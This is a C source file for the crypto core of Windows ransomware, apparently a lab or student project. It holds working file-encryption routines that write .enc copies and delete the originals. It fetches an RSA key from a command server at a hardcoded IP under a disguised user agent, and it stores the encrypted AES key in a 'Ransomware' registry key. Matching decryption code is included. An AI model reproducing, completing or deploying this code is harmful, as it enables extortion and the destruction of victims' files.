#include "crypto.h"

#include <stdio.h>
#include <string.h>
#include <winreg.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")


void InitializeCrypto(HCRYPTPROV *hProv, HCRYPTKEY *hAesKey, HCRYPTKEY *hRsaKey, BYTE **aesKeyBlob) {
    DWORD aesBlobLen = 0, rsaBlobLen = 0;
    BYTE *rsaKeyBlob;
    if (!CryptAcquireContext(hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Error at CryptAcquireContext %d\n", GetLastError());
        return;
    }
    if (!CryptGenKey(*hProv, CALG_AES_128, CRYPT_EXPORTABLE, hAesKey)) {
        printf("Error at CryptGenKey for AES: %d\n", GetLastError());
        CryptReleaseContext(*hProv, 0);
        return;
    }
    if (!CryptGenKey(*hProv, AT_KEYEXCHANGE, (2048 << 16) | CRYPT_EXPORTABLE, hRsaKey)) {
        printf("Error at CryptGenKey for RSA: %d\n", GetLastError());
        CryptReleaseContext(*hProv, 0);
        return;
    }
    if (CryptExportKey(*hAesKey, 0, PLAINTEXTKEYBLOB, 0, NULL, &aesBlobLen)) {
        *aesKeyBlob = (BYTE*)malloc(aesBlobLen);
    } else {
        printf("Error getting blob length: %d\n", GetLastError());
    }
    if (*aesKeyBlob && CryptExportKey(*hAesKey, 0, PLAINTEXTKEYBLOB, 0, *aesKeyBlob, &aesBlobLen)) {
        printf("Export successful! Blob size: %ld bytes\nAES 128 key: ", aesBlobLen);
        for (DWORD i = 12; i < aesBlobLen; i++) {
            printf("%02x", (*aesKeyBlob)[i]);
        }
        printf("\n");
    }
    if (CryptExportKey(*hRsaKey, 0, PRIVATEKEYBLOB, 0, NULL, &rsaBlobLen)) {
        rsaKeyBlob = (BYTE*)malloc(rsaBlobLen);
        CryptExportKey(*hRsaKey, 0, PRIVATEKEYBLOB, 0, rsaKeyBlob, &rsaBlobLen);
        // printf("RSA private key blob: ");
        // for (size_t i = 0; i < rsaBlobLen; i++) {
        //     printf("%02x", rsaKeyBlob[i]);
        // }
        // printf("\n");
    }
    if (CryptExportKey(*hRsaKey, 0, PUBLICKEYBLOB, 0, NULL, &rsaBlobLen)) {
        rsaKeyBlob = (BYTE*)malloc(rsaBlobLen);
        CryptExportKey(*hRsaKey, 0, PUBLICKEYBLOB, 0, rsaKeyBlob, &rsaBlobLen);
        // printf("RSA public key blob: ");
        // for (size_t i = 0; i < rsaBlobLen; i++) {
        //     printf("%02x", rsaKeyBlob[i]);
        // }
        // printf("\n");
    }
}

void SaveToRegistry(char *valueName, BYTE *data, DWORD dataLen) {
    HKEY hKey;
    char* path = "SOFTWARE\\Ransomware";
    if (RegCreateKeyEx(HKEY_CURRENT_USER, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, valueName, 0, REG_BINARY, data, dataLen) == ERROR_SUCCESS) {

        } else { 

        }
    } else {
        
    }
    RegCloseKey(hKey);
}

void KeyEncrypt(BYTE **key, HCRYPTKEY hKey) {
    printf("Encrypting key\n");
    BYTE *encryptedKey = (BYTE*)malloc(256);
    DWORD encryptedKeyLen = 256;
    DWORD keyLen = 28;
    memcpy(encryptedKey, *key, 28);
    if (CryptEncrypt(hKey, 0, TRUE, 0, encryptedKey, &keyLen, encryptedKeyLen)) {
        free(*key);
        *key = encryptedKey;
        SaveToRegistry("EncryptedKey", *key, encryptedKeyLen);
        printf("Encrypted key successfully\n");
    } else {
        free(encryptedKey);
    }
}

void FileEncrypt(char *path, HCRYPTPROV hProv, HCRYPTKEY hKey) {
    FILE *fptr = fopen(path, "rb+");
    if (!fptr) return;
    unsigned char *newPath = (unsigned char*)malloc(260);
    sprintf(newPath, "%s.enc", path);
    FILE *fptr2 = fopen(newPath, "wb");
    if (!fptr2) {
        free(newPath);
        fclose(fptr);
        return;
    }
    DWORD chunkSize = 1024*16;
    DWORD bufferSize = chunkSize + 16;
    BYTE *buffer = (BYTE*)malloc(bufferSize);
    DWORD bytesRead = 0;
    BYTE iv[16];
    if (!CryptGenRandom(hProv, 16, iv)) {
        fclose(fptr);
        free(buffer);
        return;
    } else {
        fwrite(iv, 1, 16, fptr2);
    }
    BOOL final = FALSE;
    DWORD dwMode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);
    while ((bytesRead = fread(buffer, 1, chunkSize, fptr)) > 0) {
        if (feof(fptr)) final = TRUE;
        DWORD workingLen = bytesRead;
        if (CryptEncrypt(hKey, 0, final, 0, buffer, &workingLen, bufferSize)) {
            fwrite(buffer, 1, workingLen, fptr2);
        }
    }
    free(buffer);
    free(newPath);
    fclose(fptr);
    fclose(fptr2);
    remove(path);
}

void HexToBytes(const char *hex, BYTE* bytes) {
    for (size_t i = 0; i < strlen(hex); i+=2) {
        sscanf(hex + i, "%02hhx", &bytes[i / 2]);
    }
}

char* GetRSAKey(char *id) {
    HINTERNET hInternet = NULL, hConnection = NULL;
    char *fullUrl = NULL;
    char *raw_res = (char*)malloc(16384); 
    if (!raw_res) return NULL;
    raw_res[0] = '\0';

    size_t urlLen = strlen("http://172.29.71.202:5001/") + (id ? strlen(id) + 5 : 1);
    fullUrl = (char*)malloc(urlLen);
    
    if (id) sprintf(fullUrl, "http://172.29.71.202:5001/?id=%s", id);
    else sprintf(fullUrl, "http://172.29.71.202:5001/");

    hInternet = InternetOpen("MSYS2_Client", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) goto cleanup;

    hConnection = InternetOpenUrl(hInternet, fullUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnection) goto cleanup;

    char buffer[2048];
    DWORD bytesRead;
    while (InternetReadFile(hConnection, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        strcat(raw_res, buffer);
    }

cleanup:
    if (fullUrl) free(fullUrl);
    if (hConnection) InternetCloseHandle(hConnection);
    if (hInternet) InternetCloseHandle(hInternet);

    if (raw_res[0] == '\0') {
        free(raw_res);
        return NULL;
    }

    char *colon = strchr(raw_res, ':');
    if (colon) {
        size_t id_len = colon - raw_res;
        char *id_str = (char*)malloc(id_len + 1);
        strncpy(id_str, raw_res, id_len);
        id_str[id_len] = '\0';
        BYTE *id_bytes = (BYTE*)malloc(id_len / 2);
        HexToBytes(id_str, id_bytes);
        char *key_only = strdup(colon + 1);
        SaveToRegistry("id", id_bytes, (DWORD)(id_len / 2));
        free(id_str);
        free(raw_res);
        return key_only;
    }

    return raw_res;
}

HCRYPTKEY ImportRSAPrivateKey(char *hexStr, HCRYPTPROV hProv) {
    DWORD blobLen = strlen(hexStr) / 2;
    BYTE *blobData = (BYTE*)malloc(blobLen);
    HexToBytes(hexStr, blobData);
    HCRYPTKEY hKey = 0;
    CryptImportKey(hProv, blobData, blobLen, 0, 0, &hKey);
    RtlZeroMemory(blobData, blobLen);
    free(blobData);
    return hKey;
}

HCRYPTKEY ImportRSAPublicKey(char *hexStr, HCRYPTPROV hProv) {
    DWORD blobLen = strlen(hexStr) / 2;
    BYTE *blobData = (BYTE*)malloc(blobLen);
    HexToBytes(hexStr, blobData);
    HCRYPTKEY hKey = 0;
    CryptImportKey(hProv, blobData, blobLen, 0, CRYPT_EXPORTABLE, &hKey);
    RtlZeroMemory(blobData, blobLen);
    free(blobData);
    return hKey;
}

HCRYPTKEY ImportAESKey(char *hexStr, HCRYPTPROV hProv) {
    BYTE hexRaw[16];
    HexToBytes(hexStr, hexRaw);

    #pragma pack(push, 1)
    struct {
        BLOBHEADER header;
        DWORD cbSize;
        BYTE keyData[16];
    } keyBlob;
    #pragma pack(pop)

    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_AES_128;
    keyBlob.cbSize = 16;
    memcpy(keyBlob.keyData, hexRaw, 16);

    HCRYPTKEY hKey = 0;
    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        printf("Error importing key: %d\n", GetLastError());
        return 0;
    }
    return hKey;
}

HCRYPTKEY ImportAESKeyFromBlob(BYTE *blob, DWORD blobLen, HCRYPTPROV hProv) {
    HCRYPTKEY hKey = 0;

    if (!blob || blobLen == 0) {
        printf("Invalid AES blob\n");
        return 0;
    }

    if (!CryptImportKey(hProv, blob, blobLen, 0, 0, &hKey)) {
        printf("Import AES key failed: %d\n", GetLastError());
        return 0;
    }

    printf("Import AES key success\n");
    return hKey;
}

void FileDecrypt(char *path, HCRYPTPROV hProv, HCRYPTKEY hKey) {
    FILE *fptr = fopen(path, "rb+");
    if (!fptr) return;
    unsigned char *newPath = (unsigned char*)malloc(260);
    size_t len = strlen(path);
    strncpy(newPath, path, len - 4);
    newPath[len - 4] = '\0';
    FILE *fptr2 = fopen(newPath, "wb");
    if (!fptr2) {
        free(newPath);
        fclose(fptr);
        return;
    }
    DWORD chunkSize = 1024*16;
    DWORD bufferSize = chunkSize + 16;
    BYTE *buffer = (BYTE*)malloc(bufferSize);
    DWORD bytesRead;
    BOOL final = FALSE;
    BYTE iv[16];
    fread(iv, 1, 16, fptr);
    DWORD dwMode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);
    while (1) {
        bytesRead = (DWORD)fread(buffer, 1, chunkSize, fptr);
        if (bytesRead < chunkSize) {
            final = TRUE;
        }
        DWORD workingLen = bytesRead;
        if (CryptDecrypt(hKey, 0, final, 0, buffer, &workingLen)) {
            fwrite(buffer, 1, workingLen, fptr2);
        }
        if (final) break;
    }
    free(buffer);
    free(newPath);
    fclose(fptr);
    fclose(fptr2);
    remove(path);
}

BYTE* LoadFromRegistry(char *valueName, DWORD *dataLen) {
    HKEY hKey;
    char* path = "SOFTWARE\\Ransomware";
    BYTE *buffer = NULL;
    DWORD bufferSize = 0;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueEx(hKey, valueName, NULL, NULL, NULL, &bufferSize) == ERROR_SUCCESS) {
            buffer = (BYTE*)malloc(bufferSize);
            if (RegQueryValueEx(hKey, valueName, NULL, NULL, buffer, &bufferSize) == ERROR_SUCCESS) {
                *dataLen = bufferSize;
            }
        }
    }
    return buffer;
}

void KeyDecrypt(BYTE **key, HCRYPTKEY hKey) {
    DWORD dwDataLen = 256; 
    BYTE *decryptedKey = (BYTE*)malloc(dwDataLen);
    if (decryptedKey == NULL) return;

    memcpy(decryptedKey, *key, 256);
    
    if (CryptDecrypt(hKey, 0, TRUE, 0, decryptedKey, &dwDataLen)) {
        free(*key);
        *key = (BYTE*)realloc(decryptedKey, dwDataLen);
        printf("Decrypted Key (Hex): ");
        for (DWORD i = 0; i < dwDataLen; i++) {
            printf("%02X ", (*key)[i]);
        }
        printf("\n");
    } else {
        free(decryptedKey);
        printf("Key decrypted failed\n");
    }
}

void FinalizeCrypto(HCRYPTPROV *hProv, HCRYPTKEY *hAesKey, HCRYPTKEY *hRsaKey, BYTE **keyBlob) {
    if (keyBlob && *keyBlob) {
        free(*keyBlob);
        *keyBlob = NULL;
    }
    if (hAesKey && *hAesKey) {
        CryptDestroyKey(*hAesKey);
        *hAesKey = 0;
    }
    if (hRsaKey && *hRsaKey) {
        CryptDestroyKey(*hRsaKey);
        *hRsaKey = 0;
    }
    if (hProv && *hProv) {
        CryptReleaseContext(*hProv, 0);
        *hProv = 0;
    }
}